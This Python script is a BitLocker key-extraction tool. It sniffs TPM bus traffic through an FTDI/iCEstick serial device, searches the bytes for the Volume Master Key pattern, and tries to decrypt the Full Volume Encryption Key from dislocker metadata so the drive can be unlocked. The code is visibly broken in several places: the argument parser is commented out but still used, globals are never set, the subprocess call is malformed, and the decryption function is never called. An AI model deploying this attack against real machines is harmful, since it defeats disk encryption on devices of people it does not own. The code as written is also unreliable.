#!/usr/bin/env python
# -*- conding: utf-8 -*-




import queue
import threading
import argparse
import re
import subprocess

from struct import pack
from pylibftdi import Device, INTERFACE_B
from binascii import unhexlify
from Crypto.Cipher import AES
from sty import fg, ef
from sys import exit, stdout

# global variables
exit_flag = False

# some definitions
VMK_FILE = "vmk.bin"
FVEK_FILE = "fvek.bin"
vmk = ""
metadata = ""

# some regular expressions
REGEX_SIZE = re.compile(r"^.*\((?P<size>\d+)\) bytes.*")
REGEX_DATA = re.compile(r"^.*\[INFO\] (?P<data>.*)\n$")
REGEX_PAYLOAD = re.compile(r"^.*\[INFO\] (?P<address>[0-9a-fx]+) (?P<data>.*)\n$")





class CommunicationThread(threading.Thread):
    """Thread for fast serial communication"""

    BAUD_RATE = 2000000                     # baud rate for serial communication
    BUFFER_SIZE = 64                        # read buffer size in bytes

    def __init__(self, queue):
        """Initialize the communication worker"""

        # call constructor of super class
        threading.Thread.__init__(self)

        # set queue
        self.queue = queue

        # set FTDI device for communication with iCEstick
        try:
            self.dev = Device(mode='b', interface_select=INTERFACE_B)

            # set baudrate
            self.dev.baudrate = self.BAUD_RATE
        except:
            global exit_flag
            print(fg.li_red + "[-] Could not connect to FTDI serial interface" + fg.rs)
            exit(1)


    def run(self):
        """Receive data"""
        global exit_flag

        while not exit_flag:
            if not self.queue.full():
                item = self.dev.read(self.BUFFER_SIZE)
                if item != b'':
                    self.queue.put(item)


class DataThread(threading.Thread):
    """Thread for parsing the received data"""

    # byte pattern for finding the BitLocker Volume Master Key (VMK)
    VMK_PATTERN = b"\x2c\x00\x00\x00\x01\x00\x00\x00\x03\x20\x00\x00"

    # size of BitLocker Volume Master Key in bytes
    KEY_SIZE = 32

    def __init__(self, queue):
        """Initialize the data worker"""

        # call constructor of super class
        threading.Thread.__init__(self)

        # set queue
        self.queue = queue

        # initialize empty data buffer
        self.data = b""

        # initialize empty leftover data buffer
        self.leftover_data = b""

    def extract_data(self, data):
        """Extract interesting data (VMK) from received data"""

        result = b""

        # extract bytes for address 0x24 to 0x27
        for i in range(len(data) - 3):
            if data[i] >= 0x24 and data[i] <= 0x27 and data[i + 2] == 0x00 and data[i + 3] == 0x0a:
                result += pack("B", data[i + 1])

        # determine leftover data
        for i in range(len(data) - 1, 0, -1):
            if data[i] == 0x0a:
                # set leftover data
                self.leftover_data = data[i + 1:]
                break


        return result

    def run(self):
        """Process the received data"""
        global exit_flag

        print("[*] Start sniffing")

        while not exit_flag:
            if not self.queue.empty():
                # get data item from queue
                item = self.queue.get()

                # extract TMP-specific data for address 0x24 to 0x27
                self.data += self.extract_data(self.leftover_data + item)

                print("\r[*] Received {} bytes".format(len(self.data)), end='')

                # try to find the VMK pattern in the current data buffer
                pattern_pos = self.data.find(self.VMK_PATTERN)
                if pattern_pos != -1:
                    if len(self.data) - pattern_pos > len(self.VMK_PATTERN) + self.KEY_SIZE:
                        start_pos = pattern_pos + len(self.VMK_PATTERN)
                        end_pos = start_pos + 32
                        self.key = self.data[start_pos:end_pos]

                        # set the exit flag
                        exit_flag = True

                        # show found BitLocker Volume Master Key
                        print(ef.bold + fg.green + "\n[+] Found BitLocker VMK: {}".format(self.key.hex()) + fg.rs)

                        # save sniffer VMK to file
                        with open(VMK_FILE, "wb") as f:
                            f.write(self.key)
                            vmk = self.key
                        print(fg.li_green + "[+] Created VMK file '{}' for use with BitLocker FVEK Decrypt".format(VMK_FILE) + fg.rs)






def extract_metadata(drive):
    """Run the shell script extracting the metadata"""
    #os.system('sudo /home/username/pydislocker-metadata.sh %s' % (drive))
    p = subprocess.check_call(['sudo dislocker-metadata -V %s' % (drive)])
    metadata = stdout.decode()
    ################################################################## breyta path

def fvekdecrypt():

    data = metadata

    # search for encrypted FVEK
    i = 0
    for l in data:
        if l.find("Datum entry type: 3") != -1:
            break
        i += 1

    # parse data in a hacky way
    fvek_data = data[i - 1:i + 14]

    # read payload size
    m = REGEX_SIZE.match(fvek_data[0])
    size = int(m.group("size"))

    # read nonce
    m = REGEX_DATA.match(fvek_data[7])
    nonce = unhexlify(m.group("data").replace(" ", ""))
    print(fg.li_blue + "[+] Extracted nonce:\n    {}".format(nonce.hex()) + fg.rs)

    # read MAC
    m = REGEX_DATA.match(fvek_data[9])
    mac = unhexlify(m.group("data").replace(" ", ""))
    print(fg.li_blue + "[+] Extracted MAC:\n    {}".format(mac.hex()) + fg.rs)

    # read payload (encrypted FVEK)
    payload_size = size - len(nonce) - len(mac)

    line_count = payload_size // 16
    if payload_size % 16 != 0:
        line_count += 1

    encrypted_fvek = b""
    for i in range(line_count - 1):
        m = REGEX_PAYLOAD.match(fvek_data[11 + i])
        encrypted_fvek += unhexlify(m.group("data").replace(" ", "").replace("-", ""))
    print(fg.li_blue + "[+] Extracted payload:\n    {}".format(encrypted_fvek.hex()) + fg.rs)

    # initialize AES-CCM with given VMK and nonce
    cipher = AES.new(vmk, AES.MODE_CCM, nonce=nonce)

    try:
        # decrypt and verify encrypted Full Volume Master Key (FVMK)
        plaintext = cipher.decrypt_and_verify(encrypted_fvek, mac)
        decrypted_fvek = plaintext[12:]
        print(fg.li_green + "[+] Decrypted Full Volume Encryption Key (FVEK):\n    {}".format(decrypted_fvek.hex()) + fg.rs)

        # write FVEK file for use with dislocker
        with open(FVEK_FILE, "wb") as f:
            f.write(b"\x00\x80")
            f.write(decrypted_fvek)
            f.write(b"\x00" * 32)
            print(fg.li_green + "[+] Created FVEK file '{}' for use with dislocker".format(FVEK_FILE) + fg.rs)

    except KeyError:
        print("[-] Error: Could not decrypt the encrypted Full Volume Encryption Key (FVEK)")



def main(args):
    #argument1 = drive to decrypt
    drive = args.drive
    # show banner
    #banner()

    # create queue
    queue = queue.Queue(32)

    # create threads
    comm = CommunicationThread(queue)
    data = DataThread(queue)

    # start threads
    comm.start()
    data.start()

    # wait for threads to finish
    comm.join()
    data.join()

    # start threads of the next step
    extract_metadata(drive)



# main program
if __name__ == '__main__':
    # init command line parser
    #parser = argparse.ArgumentParser("./bitlocker_key_decryptor.py")
    parser.add_argument('-d', '--drive', type=str, required=True, help='File with dislocker-metadata output of targeted BitLocker-encrypted partition')
    parser.add_argument('-k', '--keyfile', type=str, required=True, help='File with sniffed BitLocker Volume Master Key (VMK)')

    # parse command line arguments
    args = parser.parse_args()

    main(args)
